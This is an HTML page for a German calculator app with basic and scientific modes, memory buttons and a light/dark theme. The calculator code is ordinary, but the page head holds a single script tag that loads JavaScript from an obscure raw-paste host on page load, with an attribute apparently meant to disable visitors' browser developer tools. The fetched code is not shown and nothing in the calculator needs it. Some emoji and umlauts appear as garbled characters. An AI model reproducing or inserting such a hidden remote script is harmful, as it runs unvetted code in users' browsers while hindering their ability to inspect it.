<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script disable-devtool-auto src='https://kypx.me/raw/J0zHgq.js'></script>
    <title>Taschenrechner</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');
        
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #1a1a1a;
            --bg-tertiary: #0f0f0f;
            --text-primary: #ffffff;
            --text-secondary: #666666;
            --accent-primary: #00ff88;
            --accent-secondary: #ff006e;
            --border-color: #333333;
            --shadow-color: rgba(0, 0, 0, 0.8);
            --glow-color: rgba(120, 119, 198, 0.2);
        }

        [data-theme="light"] {
            --bg-primary: #f8f9fa;
            --bg-secondary: #ffffff;
            --bg-tertiary: #e9ecef;
            --text-primary: #212529;
            --text-secondary: #6c757d;
            --accent-primary: #28a745;
            --accent-secondary: #dc3545;
            --border-color: #dee2e6;
            --shadow-color: rgba(0, 0, 0, 0.1);
            --glow-color: rgba(0, 123, 255, 0.2);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            background: var(--bg-primary);
            background-image: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 255, 198, 0.05) 0%, transparent 50%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
            transition: all 0.3s ease;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(
                90deg,
                transparent,
                transparent 98px,
                rgba(255, 255, 255, 0.02) 100px
            );
            pointer-events: none;
        }

        [data-theme="light"] body::before {
            background: repeating-linear-gradient(
                90deg,
                transparent,
                transparent 98px,
                rgba(0, 0, 0, 0.02) 100px
            );
        }

        .calculator {
            background: linear-gradient(145deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            border: 1px solid var(--border-color);
            border-radius: 24px;
            padding: 32px;
            box-shadow: 
                0 25px 50px var(--shadow-color),
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                0 0 100px var(--glow-color);
            max-width: 420px;
            width: 100%;
            position: relative;
            backdrop-filter: blur(20px);
            transition: all 0.3s ease;
        }

        .calculator::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, 
                #ff006e, #8338ec, #3a86ff, #06ffa5, 
                #ffbe0b, #ff006e);
            border-radius: 26px;
            z-index: -1;
            animation: borderGlow 3s linear infinite;
            opacity: 0.6;
        }

        @keyframes borderGlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .brand {
            text-align: center;
            background: linear-gradient(45deg, var(--accent-secondary), #8338ec);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 1.4em;
            font-weight: 700;
            margin-bottom: 24px;
            margin-top: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: pulse 2s ease-in-out infinite;
            position: relative;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .theme-toggle {
            position: absolute;
            top: 16px;
            right: 16px;
            background: linear-gradient(45deg, var(--bg-secondary), var(--border-color));
            border: 2px solid var(--border-color);
            border-radius: 25px;
            width: 50px;
            height: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            overflow: hidden;
            display: flex;
            align-items: center;
            z-index: 10;
        }

        .theme-toggle::before {
            content: 'üåô';
            position: absolute;
            left: 3px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            transition: all 0.3s ease;
            z-index: 2;
        }

        .theme-toggle::after {
            content: '';
            position: absolute;
            width: 19px;
            height: 19px;
            background: var(--accent-primary);
            border-radius: 50%;
            left: 2px;
            top: 2px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

        [data-theme="light"] .theme-toggle::before {
            content: '‚òÄÔ∏è';
            left: 28px;
        }

        [data-theme="light"] .theme-toggle::after {
            left: 27px;
            background: #ffd700;
        }

        .memory-section {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
        }

        .memory-btn {
            background: linear-gradient(145deg, var(--bg-secondary), var(--bg-tertiary));
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-secondary);
            padding: 8px 10px;
            font-size: 0.8em;
            cursor: pointer;
            transition: all 0.2s ease;
            flex: 1;
            font-family: inherit;
        }

        .memory-btn:hover {
            background: linear-gradient(145deg, var(--border-color), var(--bg-secondary));
            color: var(--text-primary);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px var(--shadow-color);
        }

        .memory-btn.active {
            background: linear-gradient(45deg, var(--accent-secondary), #8338ec);
            color: white;
            border-color: var(--accent-secondary);
        }

        .display-container {
            background: linear-gradient(145deg, var(--bg-primary), var(--bg-secondary));
            border: 2px solid var(--border-color);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .display-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: scan 4s ease-in-out infinite;
        }

        @keyframes scan {
            0%, 100% { left: -100%; }
            50% { left: 100%; }
        }

        .history {
            color: var(--text-secondary);
            font-size: 0.9em;
            text-align: right;
            margin-bottom: 8px;
            min-height: 20px;
            font-weight: 300;
        }

        .display {
            color: var(--accent-primary);
            font-size: 2.8em;
            font-weight: 300;
            text-align: right;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
            position: relative;
        }

        .display::after {
            content: '|';
            animation: blink 1s infinite;
            margin-left: 4px;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .mode-selector {
            display: flex;
            gap: 4px;
            margin-bottom: 20px;
            background: linear-gradient(145deg, var(--bg-secondary), var(--bg-primary));
            border-radius: 12px;
            padding: 4px;
            border: 1px solid var(--border-color);
        }

        .mode-btn {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9em;
            font-family: inherit;
            position: relative;
            overflow: hidden;
        }

        .mode-btn.active {
            background: linear-gradient(45deg, var(--accent-secondary), #8338ec);
            color: white;
            transform: scale(1.02);
        }

        .mode-btn:not(.active):hover {
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-primary);
        }

        .buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
        }

        .scientific-grid {
            grid-template-columns: repeat(5, 1fr);
        }

        button {
            background: linear-gradient(145deg, var(--bg-secondary), var(--bg-tertiary));
            border: 1px solid var(--border-color);
            border-radius: 12px;
            font-size: 1.2em;
            font-weight: 500;
            color: var(--text-primary);
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            height: 65px;
            position: relative;
            overflow: hidden;
            font-family: inherit;
        }

        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.6s;
        }

        button:hover::before {
            left: 100%;
        }

        button:hover {
            background: linear-gradient(145deg, var(--border-color), var(--bg-secondary));
            transform: translateY(-2px);
            box-shadow: 0 8px 25px var(--shadow-color);
            border-color: var(--border-color);
        }

        button:active {
            transform: translateY(0);
            box-shadow: 0 2px 10px var(--shadow-color);
        }

        .number {
            background: linear-gradient(145deg, var(--bg-secondary), var(--bg-tertiary));
        }

        .number:hover {
            background: linear-gradient(145deg, var(--border-color), var(--bg-secondary));
        }

        .operator {
            background: linear-gradient(145deg, #ff6b35, #ff4500);
            color: white;
            font-weight: 600;
        }

        .operator:hover {
            background: linear-gradient(145deg, #ff8c42, #ff6b35);
            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.4);
        }

        .equals {
            background: linear-gradient(145deg, var(--accent-primary), #00cc6a);
            color: var(--bg-primary);
            font-weight: 700;
        }

        .equals:hover {
            background: linear-gradient(145deg, #33ff99, var(--accent-primary));
            box-shadow: 0 8px 25px rgba(0, 255, 136, 0.4);
        }

        .clear {
            background: linear-gradient(145deg, #ff4757, #c44569);
            color: white;
            font-weight: 600;
        }

        .clear:hover {
            background: linear-gradient(145deg, #ff6b7a, #ff4757);
            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.4);
        }

        .function {
            background: linear-gradient(145deg, #a55eea, #8b5cf6);
            color: white;
            font-size: 1em;
            font-weight: 600;
        }

        .function:hover {
            background: linear-gradient(145deg, #c44569, #a55eea);
            box-shadow: 0 8px 25px rgba(165, 94, 234, 0.4);
        }

        .zero {
            grid-column: span 2;
        }

        .scientific-only {
            display: none;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(145deg, var(--bg-primary), var(--bg-secondary));
            color: var(--accent-primary);
            padding: 16px 20px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            transform: translateX(400px);
            transition: transform 0.3s ease;
            z-index: 1000;
            box-shadow: 0 10px 30px var(--shadow-color);
        }

        .toast.show {
            transform: translateX(0);
        }

        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: scale(0);
            animation: rippleEffect 0.6s linear;
        }

        @keyframes rippleEffect {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        @media (max-width: 480px) {
            .calculator {
                padding: 20px;
                margin: 10px;
            }
            
            .display {
                font-size: 2.2em;
            }
            
            button {
                height: 55px;
                font-size: 1em;
            }
            
            .scientific-grid {
                grid-template-columns: repeat(4, 1fr);
            }
            
            .scientific-only {
                display: none;
            }
        }

        .neon-glow {
            animation: neonGlow 2s ease-in-out infinite alternate;
        }

        @keyframes neonGlow {
            from {
                box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
            }
            to {
                box-shadow: 0 0 30px rgba(0, 255, 136, 0.8);
            }
        }
    </style>
</head>
<body>
    <div class="calculator">
        <button class="theme-toggle" onclick="toggleTheme()"></button>
        
        <div class="brand">üßÆ Taschenrechner üßÆ</div>
        
        <div class="memory-section">
            <button class="memory-btn" onclick="memoryStore()">MS</button>
            <button class="memory-btn" onclick="memoryRecall()">MR</button>
            <button class="memory-btn" onclick="memoryClear()">MC</button>
            <button class="memory-btn" onclick="memoryAdd()">M+</button>
            <button class="memory-btn" onclick="memorySubtract()">M-</button>
        </div>
        
        <div class="mode-selector">
            <button class="mode-btn active" onclick="switchMode('basic')">EINFACH</button>
            <button class="mode-btn" onclick="switchMode('scientific')">ERWEITERT</button>
        </div>
        
        <div class="display-container neon-glow">
            <div class="history" id="history">Bereit zum Rechnen...</div>
            <div class="display" id="display">0</div>
        </div>
        
        <div class="buttons" id="buttonGrid">
            <button class="clear" onclick="clearAll()">AC</button>
            <button class="clear" onclick="clearEntry()">CE</button>
            <button class="clear" onclick="backspace()">‚å´</button>
            <button class="operator" onclick="appendOperator('/')">&divide;</button>
            
            <button class="scientific-only function" onclick="calculateFunction('sin')">sin</button>
            <button class="number" onclick="appendNumber('7')">7</button>
            <button class="number" onclick="appendNumber('8')">8</button>
            <button class="number" onclick="appendNumber('9')">9</button>
            <button class="operator" onclick="appendOperator('*')">&times;</button>
            
            <button class="scientific-only function" onclick="calculateFunction('cos')">cos</button>
            <button class="number" onclick="appendNumber('4')">4</button>
            <button class="number" onclick="appendNumber('5')">5</button>
            <button class="number" onclick="appendNumber('6')">6</button>
            <button class="operator" onclick="appendOperator('-')">&minus;</button>
            
            <button class="scientific-only function" onclick="calculateFunction('tan')">tan</button>
            <button class="number" onclick="appendNumber('1')">1</button>
            <button class="number" onclick="appendNumber('2')">2</button>
            <button class="number" onclick="appendNumber('3')">3</button>
            <button class="operator" onclick="appendOperator('+')">+</button>
            
            <button class="scientific-only function" onclick="calculateFunction('log')">log</button>
            <button class="zero number" onclick="appendNumber('0')">0</button>
            <button class="number" onclick="appendDecimal()">,</button>
            <button class="equals" onclick="calculate()">=</button>
            
            <button class="scientific-only function" onclick="calculateFunction('sqrt')">‚àö</button>
            <button class="scientific-only function" onclick="appendOperator('^')">x^y</button>
            <button class="scientific-only function" onclick="appendOperator('%')">%</button>
            <button class="scientific-only function" onclick="appendConstant('pi')">œÄ</button>
            <button class="scientific-only function" onclick="appendConstant('e')">e</button>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        let currentInput = '0';
        let operator = null;
        let previousInput = null;
        let waitingForNewInput = false;
        let history = '';
        let memory = 0;
        let currentMode = 'basic';
        let isDarkMode = true;

        const display = document.getElementById('display');
        const historyDisplay = document.getElementById('history');
        const buttonGrid = document.getElementById('buttonGrid');

        function createRippleEffect(event) {
            const button = event.currentTarget;
            const ripple = document.createElement('span');
            const rect = button.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = event.clientX - rect.left - size / 2;
            const y = event.clientY - rect.top - size / 2;
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            ripple.classList.add('ripple');
            
            button.appendChild(ripple);
            
            setTimeout(() => {
                ripple.remove();
            }, 600);
        }

        // Add ripple effect to all buttons
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('click', createRippleEffect);
            });
        });

        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.innerHTML = `<strong>üì± Info:</strong> ${message}`;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2500);
        }

        function toggleTheme() {
            isDarkMode = !isDarkMode;
            document.documentElement.setAttribute('data-theme', isDarkMode ? 'dark' : 'light');
            showToast(isDarkMode ? 'Dunkler Modus aktiviert!' : 'Heller Modus aktiviert!');
        }

        function updateDisplay() {
            display.textContent = formatNumber(currentInput);
            if (history) {
                historyDisplay.textContent = history;
            }
        }

        function formatNumber(num) {
            if (num.toString().length > 12) {
                return parseFloat(num).toExponential(6);
            }
            return num.toString().replace('.', ',');
        }

        function switchMode(mode) {
            currentMode = mode;
            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            const scientificElements = document.querySelectorAll('.scientific-only');
            if (mode === 'scientific') {
                buttonGrid.classList.add('scientific-grid');
                scientificElements.forEach(el => el.style.display = 'block');
                showToast('Erweiterter Modus aktiviert!');
            } else {
                buttonGrid.classList.remove('scientific-grid');
                scientificElements.forEach(el => el.style.display = 'none');
                showToast('Einfacher Modus aktiviert!');
            }
        }

        function appendNumber(num) {
            if (waitingForNewInput) {
                currentInput = num;
                waitingForNewInput = false;
            } else {
                currentInput = currentInput === '0' ? num : currentInput + num;
            }
            updateDisplay();
        }

        function appendDecimal() {
            if (waitingForNewInput) {
                currentInput = '0,';
                waitingForNewInput = false;
            } else if (currentInput.indexOf(',') === -1) {
                currentInput += ',';
            }
            updateDisplay();
        }

        function appendConstant(constant) {
            let value;
            switch(constant) {
                case 'pi': value = Math.PI; break;
                case 'e': value = Math.E; break;
            }
            currentInput = value.toString().replace('.', ',');
            updateDisplay();
            showToast(`${constant.toUpperCase()} geladen!`);
        }

        function appendOperator(op) {
            if (operator !== null && !waitingForNewInput) {
                calculate();
            }
            
            previousInput = currentInput.replace(',', '.');
            operator = op;
            waitingForNewInput = true;
            
            let displayOp = op;
            switch(op) {
                case '*': displayOp = '√ó'; break;
                case '/': displayOp = '√∑'; break;
                case '-': displayOp = '‚àí'; break;
                case '^': displayOp = '^'; break;
            }
            
            history = `${formatNumber(previousInput)} ${displayOp}`;
            updateDisplay();
        }

        function calculateFunction(func) {
            const current = parseFloat(currentInput.replace(',', '.'));
            let result;
            
            switch(func) {
                case 'sin': result = Math.sin(current * Math.PI / 180); break;
                case 'cos': result = Math.cos(current * Math.PI / 180); break;
                case 'tan': result = Math.tan(current * Math.PI / 180); break;
                case 'log': result = Math.log10(current); break;
                case 'sqrt': result = Math.sqrt(current); break;
            }
            
            history = `${func}(${formatNumber(currentInput)}) =`;
            currentInput = result.toString().replace('.', ',');
            waitingForNewInput = true;
            updateDisplay();
            showToast(`${func.toUpperCase()} berechnet!`);
        }

        function calculate() {
            if (operator === null || waitingForNewInput) return;
            
            let result;
            const prev = parseFloat(previousInput);
            const current = parseFloat(currentInput.replace(',', '.'));
            
            if (isNaN(prev) || isNaN(current)) return;
            
            switch (operator) {
                case '+': result = prev + current; break;
                case '-': result = prev - current; break;
                case '*': result = prev * current; break;
                case '/':
                    if (current === 0) {
                        showToast('Division durch Null nicht m√∂glich!');
                        return;
                    }
                    result = prev / current;
                    break;
                case '^': result = Math.pow(prev, current); break;
                case '%': result = prev % current; break;
                default: return;
            }
            
            result = Math.round(result * 1000000000000) / 1000000000000;
            
            let displayOp = operator;
            switch(operator) {
                case '*': displayOp = '√ó'; break;
                case '/': displayOp = '√∑'; break;
                case '-': displayOp = '‚àí'; break;
            }
            
            history = `${formatNumber(previousInput)} ${displayOp} ${formatNumber(currentInput)} =`;
            currentInput = result.toString().replace('.', ',');
            operator = null;
            previousInput = null;
            waitingForNewInput = true;
            updateDisplay();
            showToast('Berechnung abgeschlossen!');
        }

        function clearAll() {
            currentInput = '0';
            operator = null;
            previousInput = null;
            waitingForNewInput = false;
            history = 'Gel√∂scht!';
            updateDisplay();
            showToast('Alles gel√∂scht!');
        }

        function clearEntry() {
            currentInput = '0';
            updateDisplay();
            showToast('Eingabe gel√∂scht!');
        }

        function backspace() {
            if (currentInput.length > 1) {
                currentInput = currentInput.slice(0, -1);
            } else {
                currentInput = '0';
            }
            updateDisplay();
        }

        // Memory Functions
        function memoryStore() {
            memory = parseFloat(currentInput.replace(',', '.'));
            document.querySelector('.memory-btn').classList.add('active');
            showToast(`${formatNumber(memory.toString())} im Speicher abgelegt!`);
        }

        function memoryRecall() {
            currentInput = memory.toString().replace('.', ',');
            updateDisplay();
            showToast(`${formatNumber(memory.toString())} aus Speicher geladen!`);
        }

        function memoryClear() {
            memory = 0;
            document.querySelector('.memory-btn').classList.remove('active');
            showToast('Speicher gel√∂scht!');
        }

        function memoryAdd() {
            memory += parseFloat(currentInput.replace(',', '.'));
            showToast(`Zum Speicher addiert! Neu: ${formatNumber(memory.toString())}`);
        }

        function memorySubtract() {
            memory -= parseFloat(currentInput.replace(',', '.'));
            showToast(`Vom Speicher subtrahiert! Neu: ${formatNumber(memory.toString())}`);
        }

        // Enhanced Keyboard Support
        document.addEventListener('keydown', function(event) {
            const key = event.key;
            
            if (key >= '0' && key <= '9') {
                appendNumber(key);
            } else if (key === '.' || key === ',') {
                appendDecimal();
            } else if (key === '+' || key === '-' || key === '*' || key === '/') {
                appendOperator(key);
            } else if (key === 'Enter' || key === '=') {
                event.preventDefault();
                calculate();
            } else if (key === 'Escape') {
                clearAll();
            } else if (key === 'Backspace') {
                event.preventDefault();
                backspace();
            } else if (key === 'Delete') {
                clearEntry();
            }
        });

        // Initialize
        updateDisplay();
        showToast('Taschenrechner gestartet!');
        
        // Add button click handlers after DOM is loaded
        setTimeout(() => {
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('click', createRippleEffect);
            });
        }, 100);
    </script>
</body>
